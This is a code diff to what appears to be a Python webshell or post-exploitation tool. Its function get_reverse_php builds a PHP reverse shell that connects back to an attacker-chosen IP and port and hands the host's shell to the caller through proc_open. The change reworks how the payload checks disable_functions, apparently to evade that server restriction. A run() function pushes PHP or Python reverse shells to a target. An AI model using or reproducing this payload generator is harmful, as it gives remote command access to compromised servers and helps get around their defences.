@@ -2,7 +2,7 @@ from threading import Thread
 from time import sleep
 
 from libs.config import alias, color, gget
-from libs.myapp import base64_encode, delay_send, has_env, is_windows, send, get_system_code, randint
+from libs.myapp import base64_encode, delay_send, has_env, is_windows, send, get_system_code, randint, get_ini_value_code
 
 
 def get_reverse_php(ip: str, port: str, upload_path: str):
@@ -18,11 +18,14 @@ file_put_contents("%s", $evalCode);
 ini_set("max_execution_time",0);
 $ipaddr = "%s";
 $port = "%s";
+if(!function_exists('get_ini_value')) {
+    %s
+}
 $descriptorspec = array(0 => array("pipe","r"),1 => array("pipe","w"),2 => array("pipe","w"));
 $cwd = getcwd();
 $msg = php_uname()."\\nTemporary shall\\n";
 $type = True;
-if(!in_array('proc_open', explode(',', ini_get('disable_functions')))){
+if(!in_array('proc_open', @explode(',', get_ini_value('disable_functions')))){
     $sock = fsockopen($ipaddr, $port);
     $descriptorspec = array(
     0 => $sock,
@@ -89,7 +92,7 @@ while (True) {
 if ($type == True){
     fclose($sock);
 } else {socket_close($sock);
-}""" % (ip, port)
+}""" % (ip, port, get_ini_value_code())
 
 
 def oneline_python(code: str):
@@ -195,7 +198,8 @@ def run(ip: str, port: str, reverse_type: str = ""):
         t.start()
     elif reverse_type == "python":
         if has_env("python"):
-            t = Thread(target=send, args=(get_system_code(get_reverse_python(ip, port), False),))
+            t = Thread(target=send, args=(get_system_code(
+                get_reverse_python(ip, port), False),))
             t.setDaemon(True)
             t.start()
         else:
